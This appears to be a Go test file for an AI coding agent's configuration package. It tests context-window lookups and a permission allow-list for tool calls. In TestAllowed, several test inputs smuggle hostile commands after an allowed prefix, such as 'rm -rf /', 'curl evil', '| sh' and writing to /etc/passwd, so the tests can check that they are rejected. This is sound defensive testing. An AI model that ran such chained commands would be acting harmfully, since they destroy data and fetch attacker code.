package config

import (
	"os"
	"path/filepath"
	"testing"
)

func TestKnownContextWindow(t *testing.T) {
	tests := []struct {
		model string
		want  int
	}{
		// deepseek-chat and deepseek-reasoner route to DeepSeek-V4
		// (1M context, 2^20 tokens) per DeepSeek's V4 release notes.
		{"deepseek-chat", 1048576},
		{"deepseek-reasoner", 1048576},
		{"deepseek-v4-flash", 1048576},
		{"deepseek-v4-pro", 1048576},
		{"kimi-k2-0905", 262144},
		{"moonshot-v1-128k", 131072},
		{"glm-4-plus", 131072},
		// Unknown models get no fallback window.
		{"qwen3.5:9b", 0},
		{"", 0},
	}
	for _, tt := range tests {
		if got := KnownContextWindow(tt.model); got != tt.want {
			t.Errorf("KnownContextWindow(%q) = %d, want %d", tt.model, got, tt.want)
		}
	}
}

func TestAllowed(t *testing.T) {
	allow := []string{"write_file", "bash:go test", "bash:git commit"}
	tests := []struct {
		tool string
		args string
		want bool
	}{
		{"write_file", `{"path":"a.go"}`, true},
		{"edit_file", `{"path":"a.go"}`, false},
		{"bash", `{"command":"go test ./..."}`, true},
		{"bash", `{"command":"  go test -v"}`, true},
		{"bash", `{"command":"go build ./..."}`, false},
		{"bash", `{"command":"git commit -m x"}`, true},
		{"bash", `{"command":"git push"}`, false},
		{"bash", `{bad json`, false},
		// Control operators defeat prefix rules: the suffix is a
		// different command.
		{"bash", `{"command":"go test ./... && rm -rf /"}`, false},
		{"bash", `{"command":"go test; curl evil"}`, false},
		{"bash", `{"command":"go test | sh"}`, false},
		{"bash", `{"command":"go test $(curl evil)"}`, false},
		{"bash", `{"command":"go test > /etc/passwd"}`, false},
		// A pipeline that would produce no output still chains commands.
		{"bash", `{"command":"go test | cat"}`, false},
		// Prefix matching is deliberately coarse (the doc's "go test"
		// covers "go test ./..."): the operator check is the real
		// boundary, not token boundaries.
		{"bash", `{"command":"go test -race ./..."}`, true},
		// Args that are not for the bash tool never match a bash: rule.
		{"edit_file", `{"command":"go test ./..."}`, false},
		// Argument JSON that is not an object never matches a bash: rule.
		{"bash", `"go test ./..."`, false},
		{"bash", `{"command":"go test ./...","extra":1}`, true},
	}
	for _, tt := range tests {
		if got := Allowed(allow, tt.tool, tt.args); got != tt.want {
			t.Errorf("Allowed(%s, %s) = %v, want %v", tt.tool, tt.args, got, tt.want)
		}
	}
}

func TestAllowRule(t *testing.T) {
	tests := []struct {
		tool string
		args string
		want string
	}{
		{"write_file", `{}`, "write_file"},
		{"bash", `{"command":"go test ./..."}`, "bash:go test"},
		{"bash", `{"command":"ls"}`, "bash:ls"},
		{"bash", `{"command":""}`, "bash"},
		// Argument JSON that is not an object falls back to the tool name,
		// matching Allowed's behavior for the same input.
		{"bash", `"go test"`, "bash"},
		{"bash", `{"command":"make  build"}`, "bash:make build"},
	}
	for _, tt := range tests {
		if got := AllowRule(tt.tool, tt.args); got != tt.want {
			t.Errorf("AllowRule(%s, %s) = %q, want %q", tt.tool, tt.args, got, tt.want)
		}
	}
}

func TestAddWorkdirAllowPreservesSettings(t *testing.T) {
	dir := t.TempDir()
	path := filepath.Join(dir, ".tether", "settings.json")
	if err := os.MkdirAll(filepath.Dir(path), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(path, []byte(`{"model":"qwen3.5:9b","modules":{"git":false}}`), 0o644); err != nil {
		t.Fatal(err)
	}

	if err := AddWorkdirAllow(dir, "bash:go test"); err != nil {
		t.Fatal(err)
	}
	if err := AddWorkdirAllow(dir, "bash:go test"); err != nil { // idempotent
		t.Fatal(err)
	}
	if err := AddWorkdirAllow(dir, "write_file"); err != nil {
		t.Fatal(err)
	}

	ws := LoadWorkdirSettings(dir)
	if ws.Model != "qwen3.5:9b" || ws.Modules["git"] != false {
		t.Errorf("existing settings lost: %+v", ws)
	}
	if len(ws.Allow) != 2 || ws.Allow[0] != "bash:go test" || ws.Allow[1] != "write_file" {
		t.Errorf("allow = %v", ws.Allow)
	}
}
